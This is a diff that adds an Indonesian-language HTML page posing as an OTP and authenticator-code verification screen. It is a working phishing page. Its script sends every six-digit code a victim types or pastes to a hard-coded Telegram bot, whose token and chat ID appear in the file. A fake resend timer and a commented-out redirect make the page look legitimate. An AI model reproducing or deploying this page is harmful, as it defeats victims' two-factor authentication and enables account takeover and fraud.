@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi OTP</title>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 20px;
+      color: #222;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      margin-top: 40px;
+    }
+
+    p {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 25px;
+    }
+
+    .otp-section {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .otp-box {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .otp-box input {
+      width: 40px;
+      height: 45px;
+      text-align: center;
+      font-size: 20px;
+      border: 1.5px solid #ccc;
+      border-radius: 6px;
+      outline: none;
+      transition: border 0.2s;
+    }
+
+    .otp-box input:focus {
+      border-color: #007bff;
+    }
+
+    button {
+      display: block;
+      margin: 0 auto;
+      border: 1px solid #111;
+      background: #fff;
+      border-radius: 25px;
+      padding: 8px 20px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .resend {
+      text-align: center;
+      margin-top: 25px;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .resend span {
+      color: #004e8f;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .disabled {
+      color: #aaa !important;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="otp-section">
+    <h1>Verifikasi OTP</h1>
+    <p>Silakan masukkan OTP yang kami kirimkan ke Nomor +62xxxx</p>
+    <div class="otp-box" id="otp1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+    </div>
+    <button id="pasteBtn1">Tempel Kode</button>
+  </div>
+
+  <div class="otp-section">
+    <h1>Kode Authenticator</h1>
+    <p>Silakan masukkan kode authenticator yang ada di Aplikasi</p>
+    <div class="otp-box" id="otp2">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+    </div>
+    <button id="pasteBtn2">Tempel Kode</button>
+  </div>
+
+  <div class="resend">
+    Kirim Ulang Kode <span id="timer">0:50</span><br><br>
+    <span id="resendBtn">Saya tidak menerima kode</span>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8322445050:AAFQ6g62MEMezI91fxNRhUclP5K8Xgvb5U8";
+    const CHAT_ID = "5983910858";
+
+    // === Fungsi OTP Input ===
+    function handleOTPInput(inputs, label) {
+      inputs.forEach((input, index) => {
+        input.addEventListener("input", () => {
+          input.value = input.value.replace(/[^0-9]/g, "");
+          if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+
+          const otp = Array.from(inputs).map(i => i.value).join("");
+          if (otp.length === 6) {
+            inputs.forEach(i => i.style.borderColor = "green");
+
+            const message = `
+🔹 *${label}*
+-----------------------------
+🔢 Kode: ${otp}
+-----------------------------
+            `;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+            })
+            // untok halaman selanjotnye
+           // .then(() => {
+              //if (label === "Kode Authenticator") {
+               // window.location.href =
+               // "success.html";//
+              //}
+            //});
+          }
+        });
+
+        input.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !input.value && index > 0) {
+            inputs[index - 1].focus();
+            inputs[index - 1].value = "";
+          }
+        });
+      });
+    }
+
+    const otp1Inputs = document.querySelectorAll("#otp1 input");
+    const otp2Inputs = document.querySelectorAll("#otp2 input");
+    handleOTPInput(otp1Inputs, "Verifikasi OTP");
+    handleOTPInput(otp2Inputs, "Kode Authenticator");
+
+    // === Fungsi Tempel Kode ===
+    async function pasteCode(inputs) {
+      try {
+        const text = await navigator.clipboard.readText();
+        const digits = text.replace(/\D/g, "").slice(0, 6).split("");
+        inputs.forEach((input, i) => input.value = digits[i] || "");
+        inputs[0].dispatchEvent(new Event("input")); // trigger pengecekan otomatis
+      } catch (err) {
+        alert("Tidak dapat membaca clipboard. Izinkan akses clipboard di browser kamu.");
+      }
+    }
+
+    document.getElementById("pasteBtn1").addEventListener("click", () => pasteCode(otp1Inputs));
+    document.getElementById("pasteBtn2").addEventListener("click", () => pasteCode(otp2Inputs));
+
+    // === Fungsi Timer Kirim Ulang ===
+    const resendBtn = document.getElementById("resendBtn");
+    const timerDisplay = document.getElementById("timer");
+    let countdown;
+
+    function startTimer(duration = 50) {
+      let timeLeft = duration;
+      resendBtn.classList.add("disabled");
+      resendBtn.removeEventListener("click", handleResendClick);
+
+      countdown = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerDisplay.textContent = `${minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
+        timeLeft--;
+
+        if (timeLeft < 0) {
+          clearInterval(countdown);
+          timerDisplay.textContent = "0:00";
+          resendBtn.classList.remove("disabled");
+          resendBtn.addEventListener("click", handleResendClick);
+        }
+      }, 1000);
+    }
+
+    function handleResendClick() {
+      alert("Kode OTP baru telah dikirim!");
+      startTimer(50);
+    }
+
+    resendBtn.addEventListener("click", handleResendClick);
+
+    // Mulai timer otomatis saat halaman dibuka
+    startTimer(50);
+  </script>
+</body>
+</html>
